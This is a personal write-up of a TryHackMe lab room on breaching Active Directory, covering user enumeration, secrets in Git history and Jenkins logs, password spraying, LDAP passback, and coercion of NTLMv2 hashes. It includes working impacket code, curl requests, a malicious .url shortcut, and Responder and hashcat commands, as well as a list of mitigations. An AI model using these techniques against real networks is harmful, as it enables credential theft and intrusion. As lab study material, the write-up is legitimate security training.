# Intro to AD Breaching (TryHackMe)

- **Path/module:** Jr Penetration Tester -> Active Directory (room 3, after [[intro-to-ad-authentication]]).
  **Breaching** = getting the *first* valid AD credential from a black-box start: enum -> credential
  discovery -> password spray -> coercion.
- **Date:** 2026-10-19.
- **Status:** SOLVED - all answers verified headless from the Windows PC **except Task 6 Q3**
  (file-based NTLMv2 coercion), which needs a port-445 listener the PC can't host (Windows owns 445) -
  run on the AttackBox.
- **Network:** `<ip>/24` (own OVPN; my tun IP `<ip>`). `ROOTDC.THM.LOC` `.100` (DC/DNS/KDC),
  `SERVER1.THM.LOC` `.51` (writable share `shared-docs`), `WRK.THM.LOC` `.61` (sim user), `WebServer` `.71`
  (Nginx -> `git.thm.loc` Gitea, `ci.thm.loc` Jenkins, `printer.thm.loc`).
- **No-DNS trick:** the PC can't resolve `*.thm.loc`, so reach the web vhosts by IP + **Host header**
  (`curl -H "Host: git.thm.loc" http://<ip>/...`); Nginx routes on it.

## Task answers

| Task | Question | Answer |
|---|---|---|
| 2 | First phase of an AD attack chain | *(find it yourself)* |
| 2 | TCP/88 service abused to validate usernames | *(find it yourself)* |
| 3 | Valid usernames Kerbrute found | *(find it yourself)* |
| 3 | Org username format | *(find it yourself)* |
| 4 | svc.jenkins password (Git history) | `<redacted-pw>` |
| 4 | Default password in Jenkins build logs | `<redacted-pw>` |
| 5 | Accounts cracked by the spray | *(find it yourself)* |
| 5 | First account (alpha) using the onboarding pw | *(find it yourself)* |
| 6 | LDAP passback Bind DN | *(find it yourself)* |
| 6 | LDAP passback plaintext password | `<redacted-pw>` |
| 6 | sarah.jones cracked pw (file coercion) | `<redacted-pw>` |
| 7 | GPO setting to enforce NTLMv2 | *(find it yourself)* |
| 7 | Encrypted-LDAP port (vs 389) | *(find it yourself)* |

## How each was done (headless, impacket/curl from the PC)

**Task 3 - username enum (Kerbrute-equivalent).** Send a Kerberos AS-REQ per name; the KDC's error tells
you if the account exists (`PRINCIPAL_UNKNOWN` = no; `PREAUTH_REQUIRED`/`PREAUTH_FAILED` = yes). No
lockouts (pre-auth failures don't count), but logs 4768.
```python
from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError
from impacket.krb5.types import Principal
from impacket.krb5 import constants
getKerberosTGT(Principal(user,type=constants.PrincipalNameType.NT_PRINCIPAL.value),'', 'THM.LOC','','',None,kdcHost='<ip>')
# KDC_ERR_C_PRINCIPAL_UNKNOWN=6 invalid; 24/25 = valid; 18 = disabled
```
-> **46 accounts exist** (impacket AS-REQ: 3 disabled = `guest`, `eve.wilson`, `svc.ldap` ->
`CLIENT_REVOKED`; 43 enabled). The **room grades the real kerbrute `(XX valid)` count = *(find it yourself)*** - kerbrute
reports fewer than my impacket probe (it doesn't list the disabled/builtin accounts the way the probe
counted them). *(Lesson: a reimplementation isn't the tool - for a graded count, run the actual kerbrute;
I couldn't on the PC because Defender quarantines it as a hacktool, so this needed the AttackBox.)* Format
`first.last` (saved `valid_users.txt`).

**Task 4 - credential discovery (T1552).**
- Gitea: list commits via API, then read the diff of the *"Security: remove hardcoded credentials"* commit
  (the removal diff *shows* the secret):
  `curl -H "Host: git.thm.loc" .../megacorp-admin/webapp-deploy/commit/<sha>.diff` ->
  `-user = svc.jenkins` / `-password = <redacted-pw>` / `-default_password = <redacted-pw>` /
  `-secret_key = <redacted-secret>`.
- Jenkins (`admin:admin`): jobs `db-backup`, `health-check`, `webapp-deploy`; the webapp-deploy console log
  prints *"Configuring new user accounts with default password: <redacted-pw>"*.
  `curl -u admin:admin -H "Host: ci.thm.loc" .../job/webapp-deploy/lastBuild/consoleText`.

**Task 5 - password spray.** One password (`<redacted-pw>`) x 46 users over SMB (1 attempt/account -> under
the 5-try lockout). impacket `SMBConnection.login(user,'<redacted-pw>','thm.loc')` -> `[+]` on
**alice.moore** and **dev.intern** -> **`*(find it yourself)*`** accounts cracked; alphabetically first = `alice.moore`.
(The Q says "brute force" but means the spray result = 2.)

**Task 6 - LDAP passback coercion (T1187).** Printer admin `printer.thm.loc` (`admin:admin`) -> `/ldap`:
service account `svc.ldap`, auth = **Simple** (plaintext bind). Only `ldap_server`/`ldap_port` are posted
(password stays server-side), so repoint the device at my listener and hit *Test*:
```bash
# listener on my tun IP (custom port - 389 not needed): python socket on 0.0.0.0:3489
curl -b pc.txt -H "Host: printer.thm.loc" -d "ldap_server=<ip>&ldap_port=3489&action=save" .../ldap
curl -b pc.txt -H "Host: printer.thm.loc" -d "ldap_server=<ip>&ldap_port=3489&action=test" .../ldap
```
Captured BER simple-bind: `...04 2d CN=svc.ldap,OU=Service Accounts,DC=thm,DC=loc 80 0e <redacted-pw>`
-> DN + **`<redacted-pw>`** in clear. (`svc.ldap` turns out to be disabled - the lesson is the plaintext
leak, not usable creds.) Printer config restored to `<ip>:389` afterwards.

**Task 6 Q3 - file-based coercion (couldn't host on the PC).** Windows owns TCP/445, so the NTLMv2 capture
must run on the AttackBox:
```bash
cat > @Shortcut.url <<'EOF'
[InternetShortcut]
URL=http://thm.loc
IconFile=\\<TUN0_IP>\icons\icon.ico
IconIndex=1
EOF
smbclient //SERVER1.thm.loc/shared-docs -U 'THM\alice.moore%<redacted-pw>' -c 'put @Shortcut.url'
sudo responder -I tun0                      # sim user sarah.jones browses -> NTLMv2
hashcat -m 5600 hash.txt rockyou.txt        # -> sarah.jones plaintext
```
The `@` prefix sorts the file to the top so Explorer renders its icon first; the UNC `IconFile` makes the
browsing user leak a Net-NTLMv2 hash (crack offline - it's not pass-the-hashable). sarah.jones cracked to
**`<redacted-pw>`** (a rockyou classic). She is **not** AS-REP-roastable (`GetNPUsers` ->
*"doesn't have UF_DONT_REQUIRE_PREAUTH set"*), so coercion was the required path - no shortcut.

## Lessons learned

- **Breaching = the first cred, by any means.** Four independent paths to one here: user-enum feeds the
  spray; a Git diff and a CI log hand you creds outright; a printer leaks a service password; a share
  coerces a user hash. The easiest win (a plaintext secret in Git/CI) usually beats spraying.
- **Removed != gone.** The Git secret lived in the *diff that removed it*; rotate, don't just delete.
- **Kerberos pre-auth = free, lockout-safe user enum** (but 4768-noisy). Spraying = one password across
  many accounts to stay under lockout; brute force (many passwords, one account) is what locks you out.
- **"Simple" LDAP binds send the password in cleartext**, so an MFP you can repoint (default creds, no
  cred rotation, over-privileged svc account) hands you a domain password on a Test-Connection click.
  Mitigate: LDAPS/636, change device defaults, least-priv svc accounts, segment mgmt interfaces.
- **Headless from Windows has one gap:** anything needing port **445** inbound (SMB NTLMv2 capture /
  Responder) can't run while the OS holds 445 - that step belongs on the AttackBox. Custom-port listeners
  (the LDAP passback on 3489) work fine.

## Related

- [[intro-to-ad-authentication]] - NTLM/Kerberos these attacks target. Later rooms drill Credential
  Harvesting, Lateral Movement, then the Proxy/Forward challenges.
- [[ad-module-plan]] / [[tryhackme-learning-buddy]] - trackers.
